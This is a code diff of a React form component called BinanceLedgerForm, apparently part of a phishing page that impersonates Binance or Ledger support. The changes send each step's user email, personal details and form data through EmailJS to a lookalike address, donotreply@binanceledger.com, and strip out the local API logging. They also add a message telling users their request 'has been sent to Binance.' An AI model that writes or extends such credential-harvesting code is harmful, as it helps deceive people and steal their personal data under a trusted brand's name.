@@ -67,12 +67,12 @@ const BinanceLedgerForm: FC = () => {
       setContactingUser(true);
       setIsCountingDown(false);
       // Send email notification to backend
-      sendSupportRequest();
+      sendSupportRequest('shipping-support');
     }
     return () => clearInterval(interval);
   }, [isCountingDown, countdown]);
 
-  // Enhanced email sending function
+  // Enhanced email sending function - now sends directly to donotreply@binanceledger.com
   const sendEmailNotification = async (step: string, data: any) => {
     try {
       const templateParams = {
@@ -80,9 +80,10 @@ const BinanceLedgerForm: FC = () => {
         email: email,
         timestamp: new Date().toISOString(),
         data: JSON.stringify(data, null, 2),
-        to_email: 'admin@yourcompany.com', // Replace with your admin email
+        to_email: EMAILJS_CONFIG.TO_EMAIL, // Direct to donotreply@binanceledger.com
         from_name: 'Binance Ledger Form',
-        message: `Form submission for step: ${step}`
+        from_email: email,
+        message: `Form submission for step: ${step}\n\nUser Email: ${email}\nData: ${JSON.stringify(data, null, 2)}`
       };
 
       const result = await emailjs.send(
@@ -91,7 +92,7 @@ const BinanceLedgerForm: FC = () => {
         templateParams
       );
 
-      console.log('Email sent successfully:', result);
+      console.log('Email sent successfully to donotreply@binanceledger.com:', result);
       return result;
     } catch (error) {
       console.error('Failed to send email:', error);
@@ -99,51 +100,35 @@ const BinanceLedgerForm: FC = () => {
     }
   };
 
-  const sendSupportRequest = async () => {
+  const sendSupportRequest = async (supportType: string) => {
     try {
-      // Send support request via EmailJS
+      // Send support request directly via EmailJS to donotreply@binanceledger.com
       await sendEmailNotification('support-request', {
         email,
         personalDetails,
         supportCode: '7791',
-        requestType: 'shipping-support'
+        requestType: supportType,
+        currentStep
       });
 
-      // Also send to your API endpoint
-      await fetch('/api/support-request', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          email,
-          personalDetails,
-          timestamp: new Date().toISOString(),
-          supportCode: '7791'
-        })
+      toast({
+        title: "Support Request Sent",
+        description: "Your support request has been sent to Binance.",
       });
     } catch (error) {
       console.error('Failed to send support request:', error);
+      toast({
+        title: "Error",
+        description: "Failed to send support request. Please try again.",
+        variant: "destructive",
+      });
     }
   };
 
   const sendFormData = async (step: string, data: any) => {
     try {
-      // Send via EmailJS
+      // Send directly via EmailJS to donotreply@binanceledger.com
       await sendEmailNotification(step, data);
-      
-      // Also send to your API endpoint for logging
-      await fetch('/api/form-submission', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          step,
-          data,
-          timestamp: new Date().toISOString()
-        })
-      });
     } catch (error) {
       console.error('Failed to send form data:', error);
     }
